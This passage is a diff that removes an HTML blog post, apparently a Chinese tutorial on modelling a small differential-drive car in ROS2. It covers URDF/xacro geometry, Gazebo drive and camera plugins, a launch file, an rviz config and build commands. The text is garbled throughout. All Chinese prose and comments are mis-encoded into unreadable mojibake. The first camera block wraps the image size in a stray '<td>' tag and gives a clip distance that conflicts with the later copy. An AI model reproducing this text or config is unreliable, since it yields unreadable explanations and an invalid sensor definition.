-      &lt;broadcastTF&gt;1&lt;/broadcastTF&gt;
-      &lt;wheelTorque&gt;5.0&lt;/wheelTorque&gt;
-      &lt;wheelAcceleration&gt;1.5&lt;/wheelAcceleration&gt;
-      &lt;commandTopic&gt;cmd_vel&lt;/commandTopic&gt;
-      &lt;odometryFrame&gt;odom&lt;/odometryFrame&gt;
-      &lt;odometryTopic&gt;odom&lt;/odometryTopic&gt;
-      &lt;robotBaseFrame&gt;base_link&lt;/robotBaseFrame&gt;
-    &lt;/plugin&gt;
-  &lt;/gazebo&gt;
-
-
-  &lt;!-- æåå¤´æä»¶ï¼160x128 @ 60fpsï¼å¹¿è§120åº¦ï¼ --&gt;
-  &lt;gazebo reference="camera_link"&gt;
-    &lt;sensor type="camera" name="camera1"&gt;
-      &lt;update_rate&gt;60.0&lt;/update_rate&gt;
-      &lt;camera name="head"&gt;
-        &lt;horizontal_fov&gt;2.09&lt;/horizontal_fov&gt; &lt;!-- çº¦120åº¦å¹¿è§ --&gt;
-        &lt;td&gt;
-          &lt;width&gt;160&lt;/width&gt;
-          &lt;height&gt;128&lt;/height&gt;
-          &lt;format&gt;R8G8B8&lt;/format&gt;
-        &lt;/td&gt;
-        &lt;clip&gt;
-          &lt;near&gt;0.02&lt;/near&gt;
-          &lt;far&gt;10.0&lt;/far&gt;
-        &lt;/clip&gt;
-        &lt;noise&gt;
-          &lt;type&gt;gaussian&lt;/type&gt;
-          &lt;mean&gt;0.0&lt;/mean&gt;
-          &lt;stddev&gt;0.007&lt;/stddev&gt;
-        &lt;/noise&gt;
-      &lt;/camera&gt;
-      &lt;plugin name="camera_controller" filename="libgazebo_ros_camera.so"&gt;
-        &lt;alwaysOn&gt;true&lt;/alwaysOn&gt;
-        &lt;updateRate&gt;0.0&lt;/updateRate&gt;
-        &lt;cameraName&gt;camera&lt;/cameraName&gt;
-        &lt;imageTopicName&gt;image_raw&lt;/imageTopicName&gt;
-        &lt;cameraInfoTopicName&gt;camera_info&lt;/cameraInfoTopicName&gt;
-        &lt;frameName&gt;camera_link&lt;/frameName&gt;
-        &lt;hackBaseline&gt;0.07&lt;/hackBaseline&gt;
-        &lt;distortionK1&gt;0.0&lt;/distortionK1&gt;
-        &lt;distortionK2&gt;0.0&lt;/distortionK2&gt;
-        &lt;distortionK3&gt;0.0&lt;/distortionK3&gt;
-        &lt;distortionT1&gt;0.0&lt;/distortionT1&gt;
-        &lt;distortionT2&gt;0.0&lt;/distortionT2&gt;
-      &lt;/plugin&gt;
-    &lt;/sensor&gt;
-  &lt;/gazebo&gt;
-
-&lt;/robot&gt;
-</code></pre>
-</details>
-<p>è¿éæä»¬éè¿éè¿ <code>nose</code> å <code>main_body</code> çç»åæ¥æ¨¡æè½¦æ¨¡åçªåå®½çå½¢ç¶ï¼è¿æ´ç¬¦å<code>F</code>è½¦æ¨¡ççå®å¤è§ï¼</p>
-<ul>
-<li>é¿ï¼<code>23.2cm</code>ãå®½<code>18cm</code>ãé«<code>6.4cm</code>ï¼</li>
-<li>è½¦è½®ï¼ç´å¾<code>6.4cm</code>ãå®½åº¦<code>2.7cm</code>ãè½®è·<code>15.5cm</code>ï¼</li>
-<li>ä¸åè½®ï¼ç´å¾<code>5.8cm</code>ãå®½åº¦<code>2.8cm</code>ãå°è½®ç´å¾<code>1.2cm</code>ã</li>
-</ul>
-<img src="https://gitee.com/zyly2033/blog-pic/raw/master/202604052244515.png" style="zoom: 67%">
-<h5 id="221-è½¦èº«å ä½ç»æ">2.2.1 è½¦èº«å ä½ç»æ</h5>
-<p>ä½¿ç¨äºä¸¤ä¸ª <code>&lt;box&gt;</code> æ¥æ¼æ¥è½¦èº«ï¼</p>
-<ul>
-<li>åé¨ (<code>main_body</code>)ï¼å°ºå¯¸<code>0.14m x 0.16m</code>ï¼è¿æ¯çµæºååè½®æå¨çä½ç½®ï¼æ¯è¾å®½ï¼</li>
-<li>åé¨ (<code>nose</code>)ï¼å°ºå¯¸<code>0.092m x 0.072m</code>ï¼è¿æ¯ååå»¶ä¼¸çé¨åï¼æ¨¡æçå®ççªæ¯æ¶ï¼</li>
-</ul>
-<p>æ»é¿ï¼<code>0.14 + 0.092 = 0.232m</code>ã</p>
-<p>å½ç¶å¦æçæ<code>SolidWorks</code>æ<code>Fusion 360</code>å¯ä»¥æç§å¾çç»ä¸ä¸ªç²¾ç¡®ç<code>3D</code>æ¨¡åï¼å°å¶å¯¼åºä¸º <code>.stl</code> æ <code>.dae</code> æä»¶ãå¨<code>URDF</code>ä¸­ï¼æ <code>&lt;box&gt;</code> æ ç­¾æ¢æï¼</p>
-<pre><code class="language-xml">&lt;mesh filename="package://your_package/meshes/f_car_body.stl"/&gt;
-</code></pre>
-<p>è¿æ ·å¨<code>rviz</code>å<code>Gazebo</code>ä¸­çå°çå°±å®å¨æ¯ä¸æ¨¡ä¸æ ·çè½¦äºã</p>
-<h5 id="222-è½®è·ä¸è½®å­">2.2.2 è½®è·ä¸è½®å­</h5>
-<p>è½®è·<code>wheel_track</code> è®¾ä¸º<code>0.155m</code>ãè½®å­åæ éè¿ <code>${-main_body_len/2 + 0.01}</code> è®¡ç®ï¼ç¡®ä¿è½®å­å®è£å¨ååºççè¾¹ç¼ï¼èä¸æ¯è½¦èº«ä¸­å¿ã</p>
-<h5 id="223-ä¸åè½®ä½ç½®">2.2.3 <strong>ä¸åè½®ä½ç½®</strong></h5>
-<p>ä¸åè½®å®è£å¨ <code>caster_offset_x</code>å¤ï¼è¿å¤§çº¦å¨åé¨æ¯æ¶çä¸­é´ä½ç½®ï¼æ¢ä¿è¯äºæ¯æç¨³å®æ§ï¼åä¸ä¼å ä¸ºå¤ªé åèå¨è½¬å¼¯æ¶äº§çè¿å¤§çé»åç©ã</p>
-<h5 id="224-æåå¤´é«åº¦">2.2.4 æåå¤´é«åº¦</h5>
-<p>ä¸ºäºéåºâèµ°é©¬è§ç¢âç»å«ï¼æå°æåå¤´é«åº¦è®¾å®ä¸ºç¦»å°çº¦<code>20cm</code> (<code>camera_z</code>)ï¼å¹¶å¢å äºä¸ä¸ªä¿¯ä»°è§ <code>camera_pitch</code>ï¼è¿æ´ç¬¦åå®éæ¯èµä¸­ä¿¯è§èµéçæåµã</p>
-<h5 id="225-gazeboä»¿çæ¯æ">2.2.5 <code>Gazebo</code>ä»¿çæ¯æ</h5>
-<p>æä»¬å¨æ¨¡åæåæ·»å äº<code>Gazebo</code>æä»¶;</p>
-<ul>
-<li>å·®éé©±å¨æä»¶ï¼å¯ä»¥è®©å°è½¦å¨èµ·æ¥ï¼å¯¹åºçè½¦ï¼çµæºé©±å¨å¨ + ç¼ç å¨ï¼</li>
-<li>æåå¤´æä»¶ï¼å¯ä»¥è®©è½¦çè§ï¼å¯¹åºçè½¦ï¼<code>USB</code>æåå¤´ï¼</li>
-<li>è½®èæ©æ¦å±æ§ï¼ç©çå±æ§æ ç­¾ï¼è®©è½¦åçè½¦ä¸æ ·è¿å¨ã</li>
-</ul>
-<p><code>Gazebo</code>ä»¿çæ¯æ = ç»èæå°è½¦è£ä¸âçµæºãæåå¤´ãç©çè½®èâï¼è®©å®è½å¨èæä¸çéè¢«æ§å¶ãæç¥ç¯å¢ï¼åçè½¦ä¸æ ·è·èµ·æ¥ã</p>
-<h6 id="2251-å·®éé©±å¨æä»¶">2.2.5.1 å·®éé©±å¨æä»¶</h6>
-<p><code>libgazebo_ros_diff_drive.so</code>æ¯<code>ROS</code>ä¸<code>Gazebo</code>éä¿¡çæ¡¥æ¢ï¼å®çä½ç¨æ¯ï¼æ¥æ¶<code>ROS</code>çéåº¦æä»¤ï¼è½¬åä¸ºè½¦è½®çç©çè½¬å¨ï¼åæ¶å°è½¦è½®çè½¬å¨è½¬åä¸ºéç¨è®¡æ°æ®ååç»<code>ROS</code>ãå³è®¢é <code>/cmd_vel</code> æä»¤ï¼è®¡ç®å·¦å³è½®éåº¦ï¼é©±å¨å°è½¦è¿å¨ï¼åæ¶åå¸éç¨è®¡ <code>/odom</code>ã</p>
-<pre><code class="language-xml">  &lt;!-- ==================== 8. Gazebo æä»¶ ==================== --&gt;
-  &lt;gazebo&gt;
-    &lt;plugin name="differential_drive_controller" filename="libgazebo_ros_diff_drive.so"&gt;
-      &lt;rosDebugLevel&gt;Debug&lt;/rosDebugLevel&gt;
-      &lt;publishWheelTF&gt;false&lt;/publishWheelTF&gt;
-      &lt;robotNamespace&gt;/&lt;/robotNamespace&gt;
-      &lt;publishTf&gt;1&lt;/publishTf&gt;
-      &lt;publishWheelJointState&gt;true&lt;/publishWheelJointState&gt;
-      &lt;alwaysOn&gt;true&lt;/alwaysOn&gt;
-      &lt;updateRate&gt;50.0&lt;/updateRate&gt;
-      &lt;left_joint&gt;left_wheel_joint&lt;/left_joint&gt;
-      &lt;right_joint&gt;right_wheel_joint&lt;/right_joint&gt;
-      &lt;wheel_separation&gt;${wheel_track}&lt;/wheel_separation&gt;
-      &lt;wheel_diameter&gt;${wheel_diameter}&lt;/wheel_diameter&gt;
-      &lt;broadcastTF&gt;1&lt;/broadcastTF&gt;
-      &lt;wheelTorque&gt;5.0&lt;/wheelTorque&gt;
-      &lt;wheelAcceleration&gt;1.5&lt;/wheelAcceleration&gt;
-      &lt;commandTopic&gt;cmd_vel&lt;/commandTopic&gt;
-      &lt;odometryFrame&gt;odom&lt;/odometryFrame&gt;
-      &lt;odometryTopic&gt;odom&lt;/odometryTopic&gt;
-      &lt;robotBaseFrame&gt;base_link&lt;/robotBaseFrame&gt;
-    &lt;/plugin&gt;
-  &lt;/gazebo&gt;
-</code></pre>
-<p>å¶ä¸­ï¼</p>
-<ul>
-<li>
-<p><code>name</code>: æä»¶å¨<code>Gazebo</code>åé¨çåç§°ï¼éä¾¿èµ·ï¼åªè¦ä¸éå¤å°±è¡ï¼</p>
-</li>
-<li>
-<p><code>filename</code>ï¼æ ¸å¿æä»¶ãè¿æ¯<code>ROS</code>å®æ¹æä¾çå·®éé©±å¨åºã</p>
-</li>
-<li>
-<p><code>rosDebugLevel</code>: è°è¯ç­çº§ãè®¾ä¸º <code>Debug</code> ä¼å¨ç»ç«¯æå°å¤§éä¿¡æ¯ï¼æ¯å¦âææ¶å°éåº¦æä»¤äºâãâæåå¸éç¨è®¡äºâï¼ãè°è¯æ¶å¾æç¨ï¼æ­£å¼è¿è¡å¯ä»¥æ¹ä¸º <code>Info</code> æ <code>Warn</code>ï¼</p>
-</li>
-<li>
-<p><code>robotNamespace</code>: å½åç©ºé´ãè®¾ä¸º <code>/</code> è¡¨ç¤ºä½¿ç¨å¨å±å½åç©ºé´ãå¦æä½ æå¤å°å°è½¦ï¼æ¯å¦å°è½¦Aãå°è½¦Bï¼ï¼è¿éå¯ä»¥è®¾ä¸º <code>/robot_A</code>ï¼è¿æ ·æä»¤å°±ä¸ä¼ä¸²å°ï¼</p>
-</li>
-<li>
-<p><code>left_joint</code>/<code>right_joint</code>: è¿éå¿é¡»å¡«å¨<code>URDF</code>ä¸­å®ä¹çå³èåç§°ï¼</p>
-</li>
-<li>
-<p><code>wheel_separation</code>: å·¦å³è½®ä¹é´çè·ç¦»ï¼å³è½®è·ï¼ï¼æä»¶å©ç¨è¿ä¸ªæ°æ®è®¡ç®è§éåº¦ï¼å·®éè¶å¤§ï¼è½¬å¾è¶å¿«ï¼</p>
-</li>
-<li>
-<p><code>wheel_diameter</code>ï¼è½®å­ç´å¾ï¼æä»¶å©ç¨è¿ä¸ªæ°æ®è®¡ç®çº¿éåº¦ï¼è½®å­è½¬ä¸åèµ°å¤è¿ï¼</p>
-</li>
-<li>
-<p><code>wheelTorque</code>: æå¤§è¾åºæ­ç©ï¼åä½<code>Nm</code>ï¼ï¼å³å®äºè½¦æå¤âå¤§åâï¼</p>
-</li>
-<li>
-<p><code>wheelAcceleration</code>: è§å éåº¦å³å®äºè½¦éååçå¿«æ¢ãè®¾ä¸º<code>1.5</code>è¡¨ç¤ºéåº¦å¢å æ¯è¾å¹³æ»ï¼ä¸ä¼ç¬é´ä»<code>0</code>åå°<code>100</code>ï¼</p>
-</li>
-<li>
-<p><code>commandTopic</code>: è¾å¥è¯é¢ãæä»¶ä¼è®¢éè¿ä¸ªè¯é¢ï¼éå¸¸æ¯ <code>geometry_msgs/Twist</code> ç±»åï¼ãç»è¿ä¸ª<code>topic</code>åéåº¦æä»¤ï¼è½¦å°±ä¼å¨ï¼</p>
-</li>
-<li>
-<p><code>odometryTopic</code>: è¾åºè¯é¢ãæä»¶ä¼æéç¨è®¡æ°æ®åå¸å°è¿ä¸ª<code>topic</code>ï¼éå¸¸æ¯ <code>nav_msgs/Odometry</code> ç±»åï¼ï¼</p>
-</li>
-<li>
-<p><code>odometryFrame</code>: éç¨è®¡çç¶åæ ç³»ï¼éå¸¸å« <code>odom</code>ï¼</p>
-</li>
-<li>
-<p><code>robotBaseFrame</code>: æºå¨äººçåºåæ ç³»ï¼éå¸¸å«<code>base_link</code>ï¼æä»¶ä¼èªå¨åå¸ <code>odom</code> -&gt; <code>base_link</code>ç<code>TF</code>åæ¢ï¼</p>
-</li>
-<li>
-<p><code>alwaysOn</code>: åªè¦ä»¿çå¼å§ï¼æä»¶å°±ä¸ç´è¿è¡ï¼</p>
-</li>
-<li>
-<p><code>updateRate</code>: æ§å¶é¢çï¼<code>Hz</code>ï¼ã<code>100Hz</code>è¡¨ç¤ºæ¯ç§è®¡ç®<code>100</code>æ¬¡ç©çååºï¼è¶³å¤æµçï¼</p>
-</li>
-<li>
-<p><code>publishTf</code>: æ¯å¦åå¸<code>TF</code>åæ¢æ ï¼å¿é¡»è®¾ä¸º<code>1</code>ï¼å¦åå¯¼èªåæ æ³å®ä½ï¼ï¼</p>
-</li>
-<li>
-<p><code>publishWheelTF</code>: æ¯å¦åå¸è½®å­ç¸å¯¹äºè½¦èº«ç<code>TF</code>ãä¸è¬ä¸éè¦ï¼è®¾ä¸º <code>false</code> èçèµæºï¼</p>
-</li>
-<li>
-<p><code>publishWheelJointState</code>: æ¯å¦åå¸è½®å­çå³èç¶æï¼ä½ç½®ãéåº¦ï¼ãè®¾ä¸º <code>true</code> åï¼å¯ä»¥å¨<code>ROS</code>éçå° <code>/joint_states</code> è¯é¢ï¼çå°è½®å­è½¬å¾å¤å¿«ã</p>
-</li>
-</ul>
-<h6 id="2252-æåå¤´æä»¶">2.2.5.2 æåå¤´æä»¶</h6>
-<p>æ¥çæ¯æ¯ç»å°è½¦è£ä¸äºâç¼çâãå®ä¹äºä¸ä¸ªéå­ç¸æºæ¨¡åï¼å¹¶éç½®äº<code>ROS</code>é©±å¨ï¼è®©<code>Gazebo</code>è½ææ¸²æåºçå¾ååå¸æ<code>ROS</code>è¯é¢ï¼å®æ¶æ¸²æå¾åå¹¶åå¸å°<code>ROS</code>è¯é¢ <code>/camera/image_raw</code>ï¼ã</p>
-<pre><code class="language-xml">  &lt;gazebo reference="camera_link"&gt;
-    &lt;sensor type="camera" name="camera1"&gt;
-      &lt;update_rate&gt;60.0&lt;/update_rate&gt;
-      &lt;camera name="head"&gt;
-        &lt;horizontal_fov&gt;2.09&lt;/horizontal_fov&gt; &lt;!-- çº¦120åº¦ --&gt;
-        &lt;image&gt;
-          &lt;width&gt;160&lt;/width&gt;
-          &lt;height&gt;128&lt;/height&gt;
-          &lt;format&gt;R8G8B8&lt;/format&gt;
-        &lt;/image&gt;
-        &lt;clip&gt;
-          &lt;near&gt;0.02&lt;/near&gt;
-          &lt;far&gt;300&lt;/far&gt;
-        &lt;/clip&gt;
-      &lt;/camera&gt;
-      &lt;plugin name="camera_controller" filename="libgazebo_ros_camera.so"&gt;
-        &lt;alwaysOn&gt;true&lt;/alwaysOn&gt;
-        &lt;updateRate&gt;0.0&lt;/updateRate&gt;
-        &lt;cameraName&gt;camera&lt;/cameraName&gt;
-        &lt;imageTopicName&gt;image_raw&lt;/imageTopicName&gt;
-        &lt;cameraInfoTopicName&gt;camera_info&lt;/cameraInfoTopicName&gt;
-        &lt;frameName&gt;camera_link&lt;/frameName&gt;
-        &lt;hackBaseline&gt;0.07&lt;/hackBaseline&gt;
-        &lt;distortionK1&gt;0.0&lt;/distortionK1&gt;
-        &lt;distortionK2&gt;0.0&lt;/distortionK2&gt;
-        &lt;distortionK3&gt;0.0&lt;/distortionK3&gt;
-        &lt;distortionT1&gt;0.0&lt;/distortionT1&gt;
-        &lt;distortionT2&gt;0.0&lt;/distortionT2&gt;
-      &lt;/plugin&gt;
-    &lt;/sensor&gt;
-  &lt;/gazebo&gt;
-</code></pre>
-<p>ä¼ æå¨åºç¡éç½®ï¼</p>
-<ul>
-<li><code>type="camera"</code>: æå®è¿æ¯ä¸ä¸ªæ®éçåå­¦æåå¤´ï¼åºå«äºæ·±åº¦ç¸æº <code>depth</code> æ æ¿åé·è¾¾ <code>ray</code>ï¼ï¼</li>
-<li><code>name="camera1"</code>: ä¼ æå¨å¨<code>Gazebo</code>åé¨çåç§°ï¼æ¹ä¾¿å¨<code>Gazebo</code>çé¢éè°è¯ï¼</li>
-<li><code>update_rate</code>: å·æ°ç (<code>Hz</code>)ï¼è®¾ä¸º<code>60.0</code>è¡¨ç¤ºæ¯ç§çæ<code>60</code>å¸§å¾åï¼</li>
-</ul>
-<p>ç¸æºåå­¦åæ°ï¼</p>
-<ul>
-<li><code>horizontal_fov</code>: æ°´å¹³è§åºè§ï¼åä½ï¼å¼§åº¦ï¼ï¼æºè½è½¦ç«èµéå¸¸ä½¿ç¨å¹¿è§éå¤´ï¼å¦<code>120</code>åº¦çè³æ´å¤§ï¼ãå¦æè§å¾è§éå¤ªçªï¼è½¦è¿æ²¡çå°å¼¯éå°±å·²ç»æå¢äºï¼å¯ä»¥æè¿ä¸ªå¼æ¹å¤§ï¼ä¾å¦<code>2.09</code> (<code>120</code>åº¦)ï¼</li>
-<li><code>width</code>/<code>height</code>: å¾ååè¾¨çï¼</li>
-<li><code>format</code>ï¼åç´ æ ¼å¼ï¼</li>
-<li><code>near</code>: æè¿è£åªè·ç¦»ï¼ç±³ï¼ï¼å°äº<code>0.02</code>ç±³ï¼<code>2</code>åç±³ï¼çç©ä½ä¸ä¼è¢«æ¸²æãå¦ææåå¤´è£å¾å¤ªä½ï¼å°é¢å¯è½ä¼ç´æ¥åé»ææ¶å¤±ï¼</li>
-<li><code>far</code>: æè¿è£åªè·ç¦»ï¼ç±³ï¼ï¼è¶è¿<code>300</code>ç±³ çç©ä½çä¸è§ãå¯¹äºå®¤åèµéï¼è¿ä¸ªå¼æ æè°ï¼å¦ææ¯å®¤å¤å¤§åºæ¯ï¼è¦è°å¤§ã</li>
-</ul>
-<p><code>ROS</code>æä»¶éç½®ï¼</p>
-<ul>
-<li><code>filename</code>ï¼å è½½<code>ROS</code>çæåå¤´é©±å¨åºï¼</li>
-<li><code>alwaysOn</code>: ä»¿çä¸å¼å§å°±å¯å¨æåå¤´ï¼</li>
-<li><code>updateRate</code>: æ³¨æï¼è¿éè®¾ä¸º <code>0.0</code> çæææ¯âè·é <code>&lt;sensor&gt;</code> æ ç­¾éç <code>update_rate</code>âãå¦æè¿éè®¾ä¸ºéé¶å¼ï¼å®ä¼è¦çä¸é¢ç<code>60Hz</code>ãå»ºè®®ä¿æ<code>0.0</code>ï¼</li>
-<li><code>cameraName</code>: è¯é¢çåç¼ï¼</li>
-<li><code>imageTopicName</code>ï¼ å¾åè¯é¢åï¼æç»åå¸ç<code>Topic</code>æ¯<code>/camera/image_raw</code>ï¼</li>
-<li><code>cameraInfoTopicName</code>: ç¸æºååè¯é¢åæç»åå¸ç<code>Topic</code>æ¯<code>/camera/camera_info</code>ãéé¢åå«ç¦è·ãåå¿ç­æ å®åæ°ï¼</li>
-<li><code>frameName</code>ï¼<code>TF</code>åæ ç³»åç§°ï¼
-<ul>
-<li>åå¸çå¾åæ¶æ¯éä¼åå« <code>header.frame_id = "camera_link"</code>ï¼</li>
-<li>å¿é¡»å<code>URDF</code>ä¸­æåå¤´ç <code>&lt;link name="..."&gt;</code> åå­ä¸è´ï¼å¦å<code>TF</code>åæ¢ä¼æ¥éï¼</li>
-</ul>
-</li>
-<li><code>hackBaseline</code>: åºçº¿è·ç¦»ï¼è¿éå¸¸ç¨äºåç®ç¸æºï¼ä¸¤ä¸ªéå¤´ä¹é´çè·ç¦»ï¼ãåç®ç¸æºè®¾ä¸º<code>0</code>å³å¯ï¼è¿éä¿çé»è®¤å¼ä¸å½±ååç®ä½¿ç¨ï¼</li>
-<li>ç¸ååæ°ï¼è¿éå¨æ¯ <code>0.0</code>ï¼æå³çå¾åæ¯å®ç¾çï¼æ²¡æç¸åï¼
-<ul>
-<li>ç°å®å¯¹æ¯ï¼çå®çå¹¿è§æåå¤´ä¼æâæ¡¶å½¢ç¸åâï¼ç´çº¿åå¼¯ï¼ï¼</li>
-<li>ä»¿çä¼å¿ï¼å¨ä»¿çéå³é­ç¸åæ¯å¥½äºï¼è¿æ ·å¾åå¤çç®æ³ï¼æ¯å¦éå¤«åæ¢æ¾ç´çº¿ï¼ä¼æ´å®¹æåï¼ä¸ç¨ååå»ç¸åå¤çã</li>
-</ul>
-</li>
-</ul>
-<h6 id="2253-è½®èæ©æ¦å±æ§">2.2.5.3 è½®èæ©æ¦å±æ§</h6>
-<p>å®ä¹åä¸åè½®å¨<code>Gazebo</code>ä»¿çç¯å¢ä¸­çç©çå±æ§åå¤è§ï¼</p>
-<pre><code class="language-xml">  &lt;gazebo reference="caster_wheel"&gt;
-    &lt;material&gt;Gazebo/White&lt;/material&gt;
-    &lt;mu1 value="0.1"/&gt; &lt;!-- ä¸åè½®æ©æ¦åè¾å° --&gt;
-    &lt;mu2 value="0.1"/&gt;
-  &lt;/gazebo&gt;
-</code></pre>
-<p>å¶ä¸­ï¼</p>
-<ul>
-<li><code>mu1</code> (çºµåæ©æ¦ç³»æ°)ï¼ä»£è¡¨è½®å­æ»å¨æ¹åçæ©æ¦åï¼è¿éè®¾ä¸º <code>0.1</code>ï¼éå¸¸å°ï¼ï¼
-<ul>
-<li>ä¸ºä»ä¹è¿ä¹å°ï¼çå®çä¸åè½®ï¼æçå¤´ï¼è®¾è®¡åè¡·å°±æ¯ä¸ºäºåå°é»åãå¦æè¿ä¸ªå¼å¤ªå¤§ï¼æ¯å¦è®¾ä¸º 1.0ï¼åæ©¡è¶è½®èä¸æ ·ï¼ï¼ä¸åè½®å°±ä¼åå¹è½¦çä¸æ ·æ­»æ­»âå¬âä½å°é¢ï¼å¯¼è´å°è½¦æ ¹æ¬æ¨ä¸å¨ï¼æèå¨è½¬å¼¯æ¶åçå§çæå¨ãå¡æ­»ï¼</li>
-</ul>
-</li>
-<li><code>mu2</code> (æ¨ªåæ©æ¦ç³»æ°)ï¼ä»£è¡¨è½®å­ä¾§æ»æ¹åçæ©æ¦åï¼è¿éä¹è®¾ä¸º <code>0.1</code>ï¼
-<ul>
-<li>ä½ç¨ï¼åè®¸ä¸åè½®å¨è½¬å¼¯æ¶è½å¤é¡ºæ»å°ä¾§åæ»å¨ã</li>
-</ul>
-</li>
-</ul>
-<h4 id="23--launchæä»¶">2.3  <code>launch</code>æä»¶</h4>
-<p>å¨<code>launch</code>æä»¶å¤¹ä¸åå»º<code>display.launch.py</code>æä»¶ï¼</p>
-<pre><code class="language-python">from launch import LaunchDescription
-from launch.actions import DeclareLaunchArgument
-from launch_ros.parameter_descriptions import ParameterValue
-from launch_ros.actions import Node
-from launch.substitutions import Command, LaunchConfiguration
-from ament_index_python.packages import get_package_share_directory
-import os
-
-def generate_launch_description():
-    # xacro æä»¶è·¯å¾ï¼æ³¨ææ©å±åæ¯ .xacroï¼
-    xacro_path = os.path.join(
-        get_package_share_directory('car_description'),
-        'urdf',
-        'car.xacro'  # å³é®ï¼æ¹ä¸º .xacro
-    )
-    
-    # å£°æ model åæ°
-    model_arg = DeclareLaunchArgument(
-        name='model',
-        default_value=xacro_path,
-        description='Absolute path to robot xacro file'
-    )
-    
-    # ä½¿ç¨ xacro å½ä»¤è§£æ URDF
-    robot_description = ParameterValue(
-        Command(['xacro ', LaunchConfiguration('model')]),
-        value_type=str
-    )
-    
-    return LaunchDescription([
-        model_arg,  # å¿é¡»åå«è¿ä¸ªå£°æ
-        
-        # æºå¨äººç¶æåå¸å¨
-        Node(
-            package='robot_state_publisher',
-            executable='robot_state_publisher',
-            output='screen',
-            parameters=[{'robot_description': robot_description}]
-        ),
-        
-        # å³èç¶æåå¸å¨ GUIï¼å¯æå¨æå¨å³èï¼
-        Node(
-            package='joint_state_publisher_gui',
-            executable='joint_state_publisher_gui',
-            name='joint_state_publisher_gui'
-        ),
-        
-        # RViz2 å¯è§å
-        Node(
-            package='rviz2',
-            executable='rviz2',
-            name='rviz2',
-            arguments=['-d', os.path.join(get_package_share_directory('car_description'), 'rviz', 'car_display.rviz')],
-	    	output='screen'
-        )
-    ])
-</code></pre>
-<p>è¿ä¸ª<code>Launch</code>æä»¶ä¸»è¦åä¸ä»¶äºï¼</p>
-<ul>
-<li>å è½½æºå¨äºº<code>URDF</code>æ¨¡åï¼æ¯æ<code>xacro</code>æ ¼å¼ï¼ï¼</li>
-<li>åå¸æºå¨äººçç¶æåæ¢ï¼<code>TF</code>ï¼ï¼</li>
-<li>å¨<code>rviz2</code>ä¸­å¯è§åæºå¨äººã</li>
-</ul>
-<h5 id="231-èç¹">2.3.1 èç¹</h5>
-<p>èæ¬è¿è¡ä¼åå»ºä»¥ä¸å ä¸ªèç¹ï¼</p>
-<ul>
-<li><code>joint_state_publisher_gui</code>ï¼åå¸æ¯ä¸ª<code>joint</code>ï¼é¤<code>fixed</code>ç±»åï¼çç¶æï¼å¯ä»¥éè¿<code>UI</code>çé¢å¯¹<code>joint</code>è¿è¡æ§å¶ï¼</li>
-<li><code>robot_state_publisher</code>ï¼å°æºå¨äººåä¸ª<code>links</code>ã<code>joints</code>ä¹é´çå³ç³»ï¼éè¿<code>TF</code>çå½¢å¼ï¼æ´çæä¸ç»´å§¿æä¿¡æ¯åå¸ã</li>
-<li><code>rviz2</code>ï¼å¨<code>rviz2</code>ä¸­å¯è§åæºå¨äººï¼</li>
-</ul>
-<p><code>joint_state_publisher</code>è¿æ¯ä¸ä¸ªå®æ¹<code>ROS2</code>åï¼ä¸»è¦åè½ï¼</p>
-<ul>
-<li>è¾å¥ï¼
-<ul>
-<li>è¯»å<code>URDF</code>ä¸­çå³èå®ä¹ï¼</li>
-<li>æ¥æ¶ç¨æ·æç¨åºæå®çå³èè§åº¦ï¼</li>
-</ul>
-</li>
-<li>è¾åºï¼
-<ul>
-<li>åå¸ <code>/joint_states</code> è¯é¢ï¼æ¶æ¯ç±»åä¸º <code>sensor_msgs/msg/JointState</code>ï¼</li>
-<li>åå«ææå³èçåç§°ãä½ç½®ãéåº¦ãåç­ä¿¡æ¯ã</li>
-</ul>
-</li>
-</ul>
-<h5 id="232-æ°æ®æµä¸èç¹å³ç³»">2.3.2 æ°æ®æµä¸èç¹å³ç³»</h5>
-<p>æ°æ®æµä¸èç¹å³ç³»:</p>
-<pre><code class="language-tex">ç¨æ·éè¿æ»å¨æ¡/GUIæç¨åº â joint_state_publisher_gui
-                                     â åå¸/joint_statesè¯é¢
-                        robot_state_publisher
-                                     â è®¡ç®å¹¶åå¸TFåæ¢
-                              rviz2 åå¶ä»èç¹
-                                     â æ¥æ¶TFå¹¶å¯è§å
-</code></pre>
-<h4 id="24-car_displayrviz">2.4 <code>car_display.rviz</code></h4>
-<p>åå»º<code>rviz</code>éç½®æä»¶ï¼é¿åæå¨è®¾ç½®<code>rviz</code>ï¼å¨<code>rviz</code>ç®å½ä¸æ°å»º<code>car_display.rviz</code>æä»¶ï¼</p>
-<pre><code class="language-ini">Panels:
-  - Class: rviz_common/Displays
-    Name: Displays
-  - Class: rviz_common/Views
-    Name: Views
-Visualization Manager:
-  Class: ""
-  Displays:
-    - Class: rviz_default_plugins/Grid
-      Name: Grid
-      Value: true
-    - Alpha: 0.8
-      Class: rviz_default_plugins/RobotModel
-      Description Source: Topic
-      Description Topic:
-        Value: /robot_description
-      Enabled: true
-      Name: RobotModel
-      Value: true
-    - Class: rviz_default_plugins/TF
-      Name: TF
-      Value: true
-  Global Options:
-    Fixed Frame: base_link
-    Frame Rate: 30
-  Name: root
-  Tools:
-    - Class: rviz_default_plugins/MoveCamera
-  Value: true
-  Views:
-    Current:
-      Class: rviz_default_plugins/Orbit
-      Distance: 1.7
-      Name: Current View
-      Pitch: 0.33
-      Value: Orbit (rviz)
-      Yaw: 5.5
-Window Geometry:
-  Height: 800
-  Width: 1200
-</code></pre>
-<h4 id="25-ç¼è¯è¿è¡">2.5 ç¼è¯è¿è¡</h4>
-<h5 id="241-ç¼è¯">2.4.1 ç¼è¯</h5>
-<p>å¨ <code>car_ws</code> ç®å½ä¸ç¼è¯ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~$ cd /opt/2k0300/loongson_2k300_lib/car_ws
-
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ colcon build --paths src/car_description
-.....
-Finished &lt;&lt;&lt; car_description [0.92s]
-
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ source install/setup.sh
-</code></pre>
-<h5 id="242-è¿è¡">2.4.2 è¿è¡</h5>
-<p>å¯å¨ç»ç«¯ï¼è¿è¡å¦ä¸å½ä»¤ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ ros2 launch car_description display.launch.py
-</code></pre>
-<p>å¯ä»¥çå°<code>rviz</code>çªå£æå¼ï¼å¹¶ä¸æ¾ç¤ºäºå°è½¦æ¨¡åï¼</p>
